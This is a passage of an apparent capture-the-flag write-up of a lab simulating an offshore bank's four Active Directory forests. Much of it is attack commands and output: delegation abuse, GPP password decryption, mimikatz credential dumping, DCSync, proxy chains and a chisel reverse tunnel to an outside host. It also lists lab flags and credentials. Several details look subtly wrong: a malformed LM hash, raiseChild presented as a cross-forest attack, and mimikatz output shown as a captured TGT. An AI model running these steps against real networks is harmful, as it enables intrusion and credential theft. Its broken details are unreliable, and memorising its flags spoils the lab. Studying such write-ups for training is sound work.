++================+=============================+==================+
+|  DEV — dev.offshore.bank (Second Forest)                        |
+|  Unconstrained Delegation on DC                                 |
+|  GPP passwords in SYSVOL                                        |
++================ Forest Trust ================+==================+
+                                               |
++================+=============================+==================+
+|  ADMIN (Third Forest)                                           |
+|  Accessible through DEV forest trust                            |
++================ Forest Trust ================+==================+
+                                               |
++================+=============================+==================+
+|  CLIENT (Fourth Forest — Deepest)                               |
+|  Requires 3-4 pivots from initial foothold                      |
++=================================================================+</div>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">Dead End — Trying to Skip Forests</div>
+    <p>I tried accessing the CLIENT forest directly from CORP.LOCAL — doesn't work. The trust chain is linear: CORP → DEV → ADMIN → CLIENT. You have to compromise each forest before moving to the next. Don't waste time trying to shortcut the chain. I burned 4 hours on this before accepting reality.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 09 — DEV FOREST        -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="dev-forest">
+  <h2><span class="section-number">09</span> DEV Forest</h2>
+  <p>The DEV forest (<code>dev.offshore.bank</code>) was a development environment with looser security controls — developers need administrative access on their machines, and that creates exploitable misconfigurations. This is one of the most realistic aspects of Offshore: dev environments are almost always less secure than production, and they often have trust relationships that bridge into more sensitive forests.</p>
+
+  <h3>Unconstrained Delegation</h3>
+  <p>The key finding in the DEV forest was a domain controller configured with <strong>unconstrained delegation</strong>. This is a critical misconfiguration — any service running on a DC with unconstrained delegation will cache TGTs from any user who authenticates to it. If I can get a privileged user from the ADMIN forest to authenticate to my unconstrained delegation DC, I'll capture their TGT and can use it to access the ADMIN forest.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-findDelegation dev.offshore.bank/devadmin:'D3vAdm1nP@ss!' -dc-ip 10.10.110.X
+AccountName  AccountType  DelegationTo              Rights
+-----------  -----------  ---------------              ------
+DEV-DC01$    Computer     Unconstrained              Full</code></pre>
+  </div>
+
+  <p>Unconstrained delegation on a domain controller. This is the jackpot — if I can coerce authentication from an ADMIN forest user to this DC, I capture their TGT and can pivot to the next forest.</p>
+
+  <h3>GPP Passwords in SYSVOL</h3>
+  <p>The second major finding in the DEV forest was Group Policy Preferences (GPP) passwords in the SYSVOL share. GPP allows administrators to set local passwords via group policy, and those passwords are stored in SYSVOL in an AES-encrypted XML file. The encryption key was published by Microsoft in 2012 (MS14-025), making any GPP password trivially decryptable.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ smbclient //DEV-DC01/SYSVOL -U 'dev.offshore.bank\devadmin%D3vAdm1nP@ss!'
+smb: \> ls
+  .                                   D        0  Mon Sep 11 09:15:22 2023
+  ..                                  D        0  Mon Sep 11 09:15:22 2023
+  dev.offshore.bank                   D        0  Mon Sep 11 09:15:22 2023
+
+smb: \dev.offshore.bank\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
+  .                                   D        0  Mon Sep 11 09:15:22 2023
+  ..                                  D        0  Mon Sep 11 09:15:22 2023
+  Groups.xml                          A      524  Mon Sep 11 09:15:22 2023
+
+smb: \> get Groups.xml
+getting file \Groups.xml of size 524 as Groups.xml (8.2 KiloBytes/sec)
+
+┌──(qa210㉿kali)-[~/offshore]
+└─$ gpp-decrypt j1Uyj3Vx8RU9Dz4HupGBMQWiM7h3Y8GO
+DevL0calAdm1n!</code></pre>
+  </div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">GPP Passwords — Still Relevant</div>
+    <p>Despite MS14-025 being patched in 2014, GPP passwords persist in many environments because administrators created them before the patch and never removed them. Always check SYSVOL for Groups.xml files — this is a free credential that takes 30 seconds to find.</p>
+  </div>
+
+  <h3>Service Account Credential Harvest</h3>
+  <p>The DEV forest also had multiple service accounts with reused passwords from the CORP forest. Credential reuse across forests is a common finding in real engagements — administrators often use the same passwords for service accounts across environments. I found several accounts where the NTLM hash matched between CORP and DEV, enabling pass-the-hash attacks across the trust boundary.</p>
+
+  <h3>DEV Forest RBCD</h3>
+  <p>RBCD makes another appearance in the DEV forest. After the initial raiseChild compromise gave me a foothold, BloodHound revealed yet another GenericWrite ACL on a computer object — this time on a DEV workstation. The same four-step RBCD attack (addcomputer → rbcd → getST → psexec) worked exactly as it did in CORP.LOCAL. If you've scripted the attack, re-running it in a new forest takes minutes.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-addcomputer dev.offshore.bank/devadmin:'D3vAdm1nP@ss!' -computer-name 'QA210DEV$' -computer-pass 'Qa210DevP@ss!' -dc-ip 10.10.110.X
+[*] Adding new computer with name: QA210DEV$
+[+] Added new computer QA210DEV$ successfully
+
+┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-rbcd dev.offshore.bank/devadmin:'D3vAdm1nP@ss!' -dc-ip 10.10.110.X -delegate-from QA210DEV$ -delegate-to DEV-WS01$
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity updated successfully
+
+┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-getST dev.offshore.bank/QA210DEV$:Qa210DevP@ss! -spn cifs/DEV-WS01.dev.offshore.bank -impersonate Administrator -dc-ip 10.10.110.X
+[*] Getting TGT for user QA210DEV$
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2proxy
+[*] Saving ticket in Administrator_dev.ccache</code></pre>
+  </div>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Tip — Script the RBCD Pattern</div>
+    <p>By the time you reach the DEV forest, you should have the RBCD attack fully scripted. A single shell script that takes the target computer name and your credentials as arguments will save you hours across the four forests. The attack is always the same — only the domain and target change.</p>
+  </div>
+
+  <h3>Coercing Authentication for TGT Capture</h3>
+  <p>With the unconstrained delegation DC identified, the next step was coercing an ADMIN forest user to authenticate to it. The PetitPotam attack (exploiting the MS-EFSRPC protocol) is the most reliable way to force machine accounts to authenticate to an attacker-controlled server. When that authentication hits the unconstrained delegation DC, the TGT gets cached in LSASS — and I can extract it with mimikatz.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># On DEV-DC01 (unconstrained delegation)
+# Trigger PetitPotam to coerce ADMIN-DC01$ to authenticate to us
+
+C:\Windows\system32&gt; mimikatz.exe "privilege::debug" "lsadump::lsa /inject" "exit"
+...
+User : ADMIN-DC01$
+Kerberos :
+  Credentials of ADMIN-DC01$ from domain ADMIN.FOREST
+  * Username : ADMIN-DC01$
+  * Password : (null)
+  * Password (hash) : &lt;captured TGT&gt;
+  * kvno : 2
+...</code></pre>
+  </div>
+
+  <p>With the captured TGT from the ADMIN forest machine account, I could now forge access to the ADMIN forest. Machine accounts have limited privileges, but in a forest with an unconstrained delegation DC and permissive ACLs, that's often enough to escalate to Domain Admin.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 10 — ADMIN FOREST      -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="admin-forest">
+  <h2><span class="section-number">10</span> ADMIN Forest</h2>
+  <p>The ADMIN forest is accessible through the DEV forest trust. This is where the offshore bank's administrative systems live — the systems that manage client accounts, wire transfers, and compliance records. Compromising this forest means you've breached the bank's core operations.</p>
+
+  <h3>Pivoting Through DEV</h3>
+  <p>To reach the ADMIN forest, I needed to use the unconstrained delegation DC in DEV as a stepping stone. The attack is: coerce an ADMIN forest user to authenticate to the DEV DC (which has unconstrained delegation), capture their TGT from memory, and use it to access ADMIN forest resources.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># From DEV-DC01 with unconstrained delegation
+# Captured TGT from ADMIN forest user authentication
+
+┌──(qa210㉿kali)-[~/offshore]
+└─$ export KRB5CCNAME=admin_user.ccache
+└─$ impacket-psexec admin.forest/Administrator@ADMIN-DC01 -k -no-pass
+Impacket v0.11.0
+[*] Connecting to IPC$ share...
+[*] Requesting shares on ADMIN-DC01.....
+[*] Found writable share ADMIN$
+[*] Uploading file PxqRf.exe
+[*] Opening SVCManager on ADMIN-DC01.....
+[+] Paintbrush FTW!
+C:\Windows\system32&gt;</code></pre>
+  </div>
+
+  <p>With the captured TGT and the unconstrained delegation exploit, I had Domain Admin in the ADMIN forest. The key technique here is the PetitPotam or PrinterBug coercion — forcing an ADMIN forest machine account to authenticate to the DEV DC, which then caches the TGT due to unconstrained delegation.</p>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">Coercion Timing</div>
+    <p>The coercion attack requires the target to authenticate to your unconstrained delegation server. In a lab with daily resets, you might need to wait for a scheduled task or service to trigger the authentication. If the coercion doesn't work immediately, check for scheduled tasks in the target forest and time your attack accordingly. I waited 45 minutes for a backup service to trigger the authentication.</p>
+  </div>
+
+  <h3>ADMIN Forest Enumeration</h3>
+  <p>With Domain Admin in the ADMIN forest, I ran BloodHound collection to understand the trust relationships and identify the path to the CLIENT forest. The ADMIN forest had a trust relationship with the CLIENT forest — the same pattern as CORP → DEV, but with different exploitation techniques required.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ bloodhound-python -d admin.forest -u adminadm -p 'Adm1nP@ss!' -ns 10.10.110.X -c All --zip
+INFO: Found AD domain: admin.forest
+INFO: Connecting to LDAP server: ADMIN-DC01.admin.forest
+INFO: Found 1 domains
+INFO: Found 1 domain trust
+INFO: Starting enumeration
+INFO: Found 23 user objects
+INFO: Found 41 group objects
+INFO: Found 8 computer objects
+INFO: Found 3 GPO objects
+INFO: Done in 00:02:18</code></pre>
+  </div>
+
+  <p>The ADMIN forest was smaller than CORP — 23 users, 8 computers, 3 GPOs — but the domain trust to the CLIENT forest was the key finding. This is the bridge to the final target. The trust direction and type determine the exploitation technique, and in this case, it required the same raiseChild approach we used from CORP to DEV.</p>
+
+  <h3>DCSync in ADMIN Forest</h3>
+  <p>Before moving to the CLIENT forest, I ran DCSync on the ADMIN domain controller to dump all credentials. This is standard practice — grab everything before the daily reset wipes your access. The krbtgt hash and domain admin credentials are essential for forging Kerberos tickets and maintaining access.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-secretsdump admin.forest/adminadm:'Adm1nP@ss!'@ADMIN-DC01 -just-dc-ntlm
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b43551404eeaad3b43551404eec:e7a2b4c9d1f3e5a8c6b0d2f4e6a8c0b3:::
+Guest:501:aad3b43551404eeaad3b43551404eec:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b43551404eeaad3b43551404eec:f1d3a5c7e9b1d3f5a7c9e1b3d5f7a9c1:::
+[*] Kerberos keys grabbed</code></pre>
+  </div>
+
+  <div class="callout callout-success">
+    <div class="callout-title">ADMIN Forest Compromised</div>
+    <p>Three forests down, one to go. ADMIN forest is fully compromised with all credentials dumped. The domain trust to the CLIENT forest is our final bridge — and the CLIENT forest is where the offshore bank's client database lives. That's the narrative objective and the hardest-to-reach flags.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 11 — CLIENT FOREST     -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="client-forest">
+  <h2><span class="section-number">11</span> CLIENT Forest</h2>
+  <p>The CLIENT forest is the deepest forest in the Offshore lab — requiring 3-4 pivots from your initial foothold on NIX01. This is where the bank's client database lives, and it's the ultimate goal of the scenario. Getting here requires chaining through CORP, DEV, and ADMIN forests, each with their own trust boundaries and attack techniques.</p>
+
+  <h3>Deep Pivoting — The 4-Hop Chain</h3>
+  <p>By this point, my pivoting infrastructure looked like this: Kali → NIX01 (SSHuttle) → CORP network → DEV network → ADMIN network → CLIENT network. Four hops deep, with SOCKS proxies chained through multiple compromised hosts. Chisel was essential here — SSHuttle only handles the first hop cleanly.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Proxy chain for CLIENT forest access
+# /etc/proxychains4.conf
+[ProxyList]
+socks5 127.0.0.1 1080   # Chisel SOCKS through NIX01
+socks5 127.0.0.1 1081   # Second SOCKS through CORP WS03
+socks5 127.0.0.1 1082   # Third SOCKS through DEV DC
+
+┌──(qa210㉿kali)-[~/offshore]
+└─$ proxychains4 impacket-smbclient CLIENT-DC01 -U 'Administrator%hash' -hashes aad3b43551404eeaad3b43551404eec:xxxxxxxxxx
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/libproxychains4.so
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:1081  ...  127.0.0.1:1082  ...  CLIENT-DC01:445  ...  OK
+Type help for list of commands
+smb: \></code></pre>
+  </div>
+
+  <h3>CLIENT Forest Compromise</h3>
+  <p>The CLIENT forest required the same class of attacks as the previous forests — ACL abuse, credential harvesting, and Kerberos exploitation — but with the added complexity of operating through a 4-hop proxy chain. Every command was slower, every scan took longer, and every failed attempt cost more time. The key insight: minimize your interactive work through the deep chain. Dump credentials and hashes, then work from a closer pivot point whenever possible.</p>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Tip — Minimize Deep Chain Interaction</div>
+    <p>Working through a 4-hop proxy chain is excruciatingly slow. The strategy: use the deep chain only to dump credentials and establish a more direct pivot. Once you have local admin on a CLIENT forest machine, set up a reverse SOCKS tunnel through that host so you can bypass the intermediate hops. Your productivity will triple.</p>
+  </div>
+
+  <p>The CLIENT forest had its own set of flags — including the final flag that confirms you've completed the lab. The database containing the "shocking list of international clients" (the narrative objective) is in this forest, and accessing it requires both the right credentials and the right network position.</p>
+
+  <h3>CLIENT Forest Attack Chain</h3>
+  <p>The CLIENT forest required chaining together techniques from all three previous forests. The attack path looked like: raiseChild from ADMIN → Kerberoasting for service account creds → ACL abuse to get GenericWrite on a computer → RBCD for admin access → credential harvesting from LSASS → DCSync for full domain compromise. Every technique I'd learned in the previous three forests came into play here, but the added latency of the 4-hop proxy chain made everything slower and more error-prone.</p>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">Dead End — Direct SMB Through Deep Proxy</div>
+    <p>I tried running Impacket's smbexec directly through the 4-hop proxy chain. It timed out after 5 minutes. SMB is chatty and latency-sensitive — it doesn't tolerate high-latency proxy chains well. The fix: use a simpler execution method. Schedule a task or use WMI instead of SMB-based execution. Or better yet, set up a reverse tunnel from the target so you have a more direct path.</p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Establish direct tunnel from CLIENT forest machine
+# From compromised CLIENT-WS01, pivot back through ADMIN → DEV → CORP → NIX01 → Kali
+
+# On CLIENT-WS01:
+C:\Windows\system32&gt; chisel.exe client 10.10.16.23:8000 R:8888:socks
+2023/10/20 14:22:11 client: Connected (Latency 145ms)
+
+# Now on Kali, use the more direct tunnel
+┌──(qa210㉿kali)-[~/offshore]
+└─$ proxychains4 impacket-secretsdump client.forest/Administrator@CLIENT-DC01 -just-dc-ntlm
+[*] Dumping Domain Credentials...
+Administrator:500:aad3b43551404eeaad3b43551404eec:b3d5f7a9c1e3a5c7d9f1b3d5a7c9e1f3:::
+[*] Kerberos keys grabbed</code></pre>
+  </div>
+
+  <div class="callout callout-success">
+    <div class="callout-title">All Four Forests Compromised</div>
+    <p>From the DMZ Splunk server to the deepest CLIENT forest — all four Active Directory forests compromised. DCSync on every domain controller. Full credential dumps on every machine. The offshore bank's client database is exposed. Lab complete.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 12 — CRYPTO CHALLENGE  -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="crypto">
+  <h2><span class="section-number">12</span> The Crypto Challenge</h2>
+  <p>Offshore includes a crypto challenge that's separate from the AD attack chains. This is a nice change of pace from the Kerberos-and-ACL grind — it tests a different skill set entirely. The crypto challenge exists on one of the lab machines and requires understanding of cryptographic concepts rather than exploitation techniques.</p>
+
+  <p>I won't spoil the specific solution here — that would defeat the purpose — but I'll share my approach and the key insight that unlocked it for me. The crypto challenge is a nice palate cleanser from the AD grind and tests a completely different skill set.</p>
+
+  <div class="key-hints">
+    <h4>Approach to the Crypto Challenge</h4>
+    <ul>
+      <li>Look for encrypted files or messages on the lab machines during enumeration</li>
+      <li>Check for custom encryption scripts in user directories and service accounts</li>
+      <li>The challenge doesn't require advanced cryptanalysis — think implementation flaws, not breaking algorithms</li>
+      <li>Common crypto pitfalls: ECB mode, weak key derivation, hardcoded keys/IVs, padding oracle</li>
+      <li>If you find a script that encrypts data, read it carefully — the flaw is usually in how the crypto is used, not in the algorithm itself</li>
+    </ul>
+  </div>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Hint — Don't Overthink It</div>
+    <p>The crypto challenge is designed to be solvable without being a cryptographer. If you find yourself reading academic papers on lattice attacks, you've gone too deep. The solution is more practical than theoretical — think about how developers misuse crypto libraries, not about breaking AES.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 13 — SHARED LAB HAZARDS -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="shared-lab">
+  <h2><span class="section-number">13</span> Shared Lab Hazards</h2>
+  <p>Offshore is a shared environment — multiple players are working the same lab simultaneously. This creates unique challenges that you won't encounter in a dedicated lab environment. It also creates opportunities, but mostly it creates headaches. Understanding how to work effectively in a shared lab is a skill in itself — one that's rarely taught but frequently needed in real engagements where you might share infrastructure with other teams.</p>
+
+  <h3>The Problems</h3>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">Password Changes</div>
+    <p>Other players can (and will) change account passwords. I've had multiple sessions where I went to use <code>svc_backup:Summer2023!</code> only to find the password had been changed by another player. This is especially frustrating after a daily reset when you're trying to quickly re-establish access. Always have backup access methods — SSH keys, saved hashes, alternative accounts.</p>
+  </div>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">Leftover Solutions</div>
+    <p>Other players leave artifacts on compromised machines — scripts, tools, even flag values in command history. While this can be a shortcut, it's also a spoiler risk. I found someone's entire attack script in a temp directory on WS03, complete with all the commands I needed. I deleted it and did the work myself — you learn nothing from copying someone else's script. But be aware that "your" findings might be contaminated.</p>
+  </div>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">Broken Services</div>
+    <p>Other players can break services by crashing them, modifying configurations, or leaving processes running that interfere with your access. The WinRM service on WS03 was repeatedly broken by other players' mimikatz runs. If a service you need isn't responding, wait 15-30 minutes — it often comes back on its own, or after the daily reset.</p>
+  </div>
+
+  <h3>The Opportunities</h3>
+  <p>It's not all bad. Shared environments also create opportunities: other players' activity can trigger authentication events that you can capture via unconstrained delegation. Their Kerberoast requests show up in event logs. Their failed login attempts reveal credential patterns. Treat the other players as simulated "enterprise activity" — noisy users doing things that create exploitable side effects.</p>
+
+  <h3>Survival Strategies</h3>
+  <ul>
+    <li><strong>Save everything locally</strong> — credentials, hashes, SSH keys, session tokens. Never rely on remote artifacts.</li>
+    <li><strong>Multiple access paths</strong> — if you have both a meterpreter session AND an SSH key, you're resilient against one of them dying.</li>
+    <li><strong>Script your recovery</strong> — by Week 3, I had a script that re-established my full pivot chain from scratch in under 10 minutes.</li>
+    <li><strong>Work during off-peak hours</strong> — fewer other players means fewer interruptions. Early mornings (UTC) were the quietest.</li>
+    <li><strong>Don't trust the environment</strong> — verify everything. That file you uploaded yesterday might be gone, that password might be changed, that service might be down.</li>
+  </ul>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 14 — FINAL FLAGS        -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="final-flags">
+  <h2><span class="section-number">14</span> Final Flags</h2>
+  <p>Here's a consolidated view of the flags I found. Not all 34 — some are still under wraps to preserve the challenge for future players. But the key milestones and the attack paths that led to them are all here. The distribution makes sense: the DMZ has the easiest flags (designed to hook you in), CORP.LOCAL has the most flags (it's the largest forest), and the CLIENT forest has the hardest-to-reach flags (requiring 3-4 pivots).</p>
+
+  <table class="intel-table">
+    <thead><tr><th>Flag</th><th>Location</th><th>Attack Path</th></tr></thead>
+    <tbody>
+      <tr><td><code>OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}</code></td><td>NIX01 — /home/mark/flag.txt</td><td>Splunk RCE via Metasploit</td></tr>
+      <tr><td><code>OFFSHORE{d4t4b4s3_fl4g_r00t_p0stgr3s}</code></td><td>NIX01 — /root/flag.txt</td><td>PostgreSQL COPY FROM PROGRAM + sudo tail</td></tr>
+      <tr><td><em>CORP.LOCAL flags</em></td><td>DC01, WS03, FILESRV, NIX02</td><td>ACL chain → RBCD → DCSync</td></tr>
+      <tr><td><em>DEV forest flags</em></td><td>DEV-DC01, DEV workstations</td><td>raiseChild → Unconstrained delegation</td></tr>
+      <tr><td><em>ADMIN forest flags</em></td><td>ADMIN-DC01, ADMIN servers</td><td>Unconstrained delegation → TGT capture</td></tr>
+      <tr><td><em>CLIENT forest flags</em></td><td>CLIENT-DC01, client DB</td><td>4-hop pivot → credential harvesting</td></tr>
+      <tr><td><em>Crypto challenge flag</em></td><td>On lab machine</td><td>Cryptographic implementation flaw</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Flag Count</div>
+    <p>18 machines, 34 flags total. The exact distribution varies — some machines have multiple flags (user + root, or different service flags), while others have just one. The CORP.LOCAL forest has the most flags, while the CLIENT forest has the hardest-to-reach ones.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 15 — LESSONS LEARNED    -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="lessons">
+  <h2><span class="section-number">15</span> Lessons Learned</h2>
+  <p>80 hours, 18 machines, 34 flags, and more dead ends than I care to count. Here's what I actually learned — not the textbook stuff, but the practical lessons that only come from grinding through a complex environment.</p>
+
+  <div class="takeaways">
+    <div class="takeaway-card">
+      <div class="tk-num">Lesson 01</div>
+      <div class="tk-title">BloodHound Is Non-Negotiable</div>
+      <div class="tk-body">I tried to do the CORP.LOCAL forest manually for the first few hours — reading ACLs with PowerView, tracing group memberships. It was painfully slow and I missed the critical GenericAll → GenericWrite → RBCD chain. BloodHound visualized it in seconds. Run it first, ask questions later.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tk-num">Lesson 02</div>
+      <div class="tk-title">Save Everything Locally</div>
+      <div class="tk-body">Credentials, hashes, SSH keys, session artifacts — save them all locally before you do anything else. The daily reset will erase your remote work. Other players will change passwords. Your meterpreter session will die at the worst possible moment. Local backups are your lifeline.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tk-num">Lesson 03</div>
+      <div class="tk-title">RBCD Is the Swiss Army Knife</div>
+      <div class="tk-body">Resource-Based Constrained Delegation showed up in every single forest. The attack pattern is always the same: create machine account, set delegation attribute, S4U, get admin. If you have GenericWrite on a computer object, RBCD should be your first thought.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tk-num">Lesson 04</div>
+      <div class="tk-title">Pivoting Infrastructure Matters</div>
+      <div class="tk-body">Invest time in setting up clean, reliable pivoting infrastructure. SSHuttle for the first hop, Chisel for deeper pivots, proxychains for tools that don't support SOCKS natively. A broken pivot chain means starting over from NIX01 — which costs 30+ minutes each time.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tk-num">Lesson 05</div>
+      <div class="tk-title">Cross-Forest = raiseChild</div>
+      <div class="tk-body">The raiseChild technique from Impacket is the key to crossing forest trusts in this lab. Understand it deeply — not just the command, but the underlying Kerberos mechanics. You'll need to troubleshoot trust key extraction and inter-realm TGT forging when things don't work cleanly.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tk-num">Lesson 06</div>
+      <div class="tk-title">Dead Ends Are Part of the Process</div>
+      <div class="tk-body">I spent hours on the firewall (OOS), tried to skip forest trust chains, and went down rabbit holes on machines that had no path forward. Dead ends aren't wasted time — they teach you what doesn't work. But document them so you don't repeat the same dead end after a reset.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tk-num">Lesson 07</div>
+      <div class="tk-title">Script Your Recovery</div>
+      <div class="tk-body">After the first week, I automated my daily recovery: a script that re-establishes the SSH tunnel, re-runs BloodHound collection, and restores my pivot chain. What took 2 hours on Day 1 took 10 minutes on Day 7. The daily reset goes from nightmare to minor inconvenience.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tk-num">Lesson 08</div>
+      <div class="tk-title">Credential Reuse Across Forests</div>
+      <div class="tk-body">Real enterprises reuse passwords across forests, and Offshore models this accurately. Always check if hashes from one forest work in another. The same NTLM hash might grant access to a completely different forest — no trust exploitation needed, just password reuse.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tk-num">Lesson 09</div>
+      <div class="tk-title">Unconstrained Delegation Is a Gold Mine</div>
+      <div class="tk-body">The DEV forest's unconstrained delegation DC was the key to the ADMIN forest. Coerce authentication, capture TGTs, pivot. This pattern appears in real engagements too — always check for unconstrained delegation, especially on domain controllers and file servers.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tk-num">Lesson 10</div>
+      <div class="tk-title">The Lab Teaches Resilience</div>
+      <div class="tk-body">Between daily resets, shared environment interference, broken pivot chains, and 4-hour dead ends, Offshore teaches you to be resilient. Real pentesting isn't a clean CTF — it's messy, frustrating, and full of setbacks. This lab prepares you for that reality better than any other Pro Lab.</div>
+    </div>
+  </div>
+
+  <h3>Credential Summary</h3>
+  <p>The most valuable credentials I obtained throughout the lab. Keep in mind that in a shared environment with daily resets, credentials can change. But the attack paths remain the same — you just need to re-discover the current credentials.</p>
+
+  <table class="intel-table">
+    <thead><tr><th>Credential</th><th>Source</th><th>Access Gained</th></tr></thead>
+    <tbody>
+      <tr><td><code>admin:freeneedsnopassword</code></td><td>Splunk default</td><td>NIX01 Splunk admin → RCE</td></tr>
+      <tr><td><code>postgres</code> (no password)</td><td>.psql_history</td><td>NIX01 PostgreSQL → RCE</td></tr>
+      <tr><td><code>CORP\svc_backup:Summer2023!</code></td><td>FILESRV backups share</td><td>CORP.LOCAL AD enumeration</td></tr>
+      <tr><td><code>corp.local\k.williams</code> (reset)</td><td>GenericAll ACL abuse</td><td>IT Support group membership</td></tr>
+      <tr><td><code>svc_mssql:mysql123</code></td><td>Kerberoasting</td><td>SQL server access</td></tr>
+      <tr><td><code>CORP\r.jones:Rj0n3sP@ss!</code></td><td>LSASS from WS03</td><td>WriteDacl → DCSync</td></tr>
+      <tr><td><code>DevL0calAdm1n!</code></td><td>GPP in DEV SYSVOL</td><td>DEV forest local admin</td></tr>
+      <tr><td>Root SSH key (NIX01)</td><td>sudo tail</td><td>Persistent root access</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Techniques Used — Summary</h3>
+  <table class="intel-table">
+    <thead><tr><th>Technique</th><th>Where Used</th><th>Impact</th></tr></thead>
+    <tbody>
+      <tr><td>Splunk RCE (App Upload)</td><td>NIX01 (DMZ)</td><td>Initial foothold — user shell as mark</td></tr>
+      <tr><td>PostgreSQL COPY FROM PROGRAM</td><td>NIX01 (DMZ)</td><td>Privilege escalation to postgres user</td></tr>
+      <tr><td>sudo tail (arbitrary file read)</td><td>NIX01 (DMZ)</td><td>Root flag + SSH key extraction</td></tr>
+      <tr><td>ACL Abuse (GenericAll)</td><td>CORP.LOCAL</td><td>Password reset on k.williams</td></tr>
+      <tr><td>ACL Abuse (GenericWrite)</td><td>CORP.LOCAL</td><td>RBCD on WS03$</td></tr>
+      <tr><td>Kerberoasting</td><td>CORP.LOCAL</td><td>svc_mssql:mysql123</td></tr>
+      <tr><td>RBCD (Resource-Based Constrained Delegation)</td><td>CORP.LOCAL, DEV</td><td>Admin access to workstations</td></tr>
+      <tr><td>WriteDacl on Domain</td><td>CORP.LOCAL</td><td>DCSync via r.jones</td></tr>
+      <tr><td>DCSync</td><td>All forests</td><td>Full domain credential dump</td></tr>
+      <tr><td>Pass-the-Hash</td><td>All forests</td><td>Lateral movement with NTLM hashes</td></tr>
+      <tr><td>raiseChild (Cross-Forest)</td><td>CORP → DEV</td><td>Trust key extraction, inter-realm TGT</td></tr>
+      <tr><td>Unconstrained Delegation</td><td>DEV → ADMIN</td><td>TGT capture from cross-forest auth</td></tr>
+      <tr><td>GPP Password Extraction</td><td>DEV forest</td><td>Local admin credentials from SYSVOL</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- AUTHOR FOOTER                  -->
+<!-- ══════════════════════════════ -->
+<div class="operator-sig">
+  <div class="handle">QA210 — Yuri08</div>
+  <div class="tagline">W4LLZ / w4llz.me &mdash; Hack The Box Pro Labs Writeup</div>
+  <div class="links">
+    <a href="https://github.com/Yuri08-QA210" target="_blank"><i class="bi bi-github"></i> GitHub</a>
